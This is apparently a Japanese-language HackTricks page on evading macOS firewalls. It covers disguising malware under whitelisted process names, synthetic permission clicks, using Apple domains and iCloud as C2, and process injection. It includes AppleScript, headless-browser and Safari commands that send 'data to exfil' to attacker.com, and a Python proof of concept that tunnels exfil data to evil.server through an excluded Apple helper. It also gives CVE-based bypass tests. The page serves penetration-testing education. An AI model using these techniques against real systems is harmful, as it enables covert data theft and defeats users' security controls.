# macOS ファイアウォールのバイパス

{{#include ../../banners/hacktricks-training.md}}

## 発見された技術

以下の技術は、いくつかの macOS ファイアウォールアプリで動作することが確認されました。

### ホワイトリスト名の悪用

- 例えば、**`launchd`** のようなよく知られた macOS プロセスの名前でマルウェアを呼び出すこと。

### 合成クリック

- ファイアウォールがユーザーに許可を求める場合、マルウェアに**許可をクリックさせる**。

### **Apple 署名のバイナリを使用**

- **`curl`** のようなもの、または **`whois`** のような他のものも。

### よく知られた Apple ドメイン

ファイアウォールは、**`apple.com`** や **`icloud.com`** のようなよく知られた Apple ドメインへの接続を許可している可能性があります。そして、iCloud は C2 として使用される可能性があります。

### 一般的なバイパス

ファイアウォールをバイパスするために試すべきアイデア。

### 許可されたトラフィックの確認

許可されたトラフィックを知ることで、潜在的にホワイトリストに登録されたドメインや、それにアクセスを許可されているアプリケーションを特定するのに役立ちます。
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNSの悪用

DNS解決は、DNSサーバーに接続することが許可されている可能性が高い**`mdnsreponder`**署名アプリケーションを介して行われます。

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### ブラウザアプリを介して

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- グーグルクローム
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- サファリ
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### プロセスインジェクションを介して

接続を許可された**プロセスにコードを注入**できれば、ファイアウォールの保護を回避できます：

{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## 最近のmacOSファイアウォールバイパス脆弱性 (2023-2025)

### ウェブコンテンツフィルター（スクリーンタイム）バイパス – **CVE-2024-44206**
2024年7月、Appleはスクリーンタイムの親の管理機能で使用されるシステム全体の「ウェブコンテンツフィルター」に影響を与える重大なバグをSafari/WebKitで修正しました。
特別に作成されたURI（例えば、二重URLエンコードされた“://”を含む）は、スクリーンタイムのACLでは認識されませんが、WebKitでは受け入れられるため、リクエストはフィルタリングされずに送信されます。したがって、URLを開くことができる任意のプロセス（サンドボックス化されたコードや署名されていないコードを含む）は、ユーザーまたはMDMプロファイルによって明示的にブロックされたドメインに到達できます。

実践テスト（未修正のシステム）：
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) ルール順序バグ in early macOS 14 “Sonoma”
macOS 14 ベータサイクル中に、Apple は **`pfctl`** のユーザースペースラッパーに回帰を導入しました。
`quick` キーワードを使用して追加されたルール（多くの VPN キルスイッチで使用される）は、静かに無視され、VPN/ファイアウォール GUI が *ブロックされた* と報告してもトラフィックの漏洩を引き起こしました。このバグは複数の VPN ベンダーによって確認され、RC 2 (ビルド 23A344) で修正されました。

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Apple署名のヘルパーサービスの悪用（レガシー - macOS 11.2以前）
macOS 11.2以前では、**`ContentFilterExclusionList`**により、**`nsurlsessiond`**やApp Storeなど約50のAppleバイナリがNetwork Extensionフレームワーク（LuLu、Little Snitchなど）で実装されたすべてのソケットフィルターファイアウォールをバイパスすることができました。  
マルウェアは単に除外されたプロセスを生成するか、そこにコードを注入し、すでに許可されたソケットを介して自分のトラフィックをトンネルすることができました。AppleはmacOS 11.2で除外リストを完全に削除しましたが、この手法はアップグレードできないシステムでは依然として関連性があります。

例の概念実証（11.2以前）：
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
---

## Tooling tips for modern macOS

1. 現在のPFルールを確認するには、GUIファイアウォールが生成したものを表示します:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. すでに *outgoing-network* 権限を持つバイナリを列挙します（ピギーバッキングに便利）:
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Objective-C/Swiftで独自のネットワーク拡張コンテンツフィルターをプログラム的に登録します。
ローカルソケットにパケットを転送する最小限のルートレスPoCは、Patrick Wardleの**LuLu**ソースコードで入手可能です。

## References

- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- <https://nosebeard.co/advisories/nbl-001.html>
- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>

{{#include ../../banners/hacktricks-training.md}}
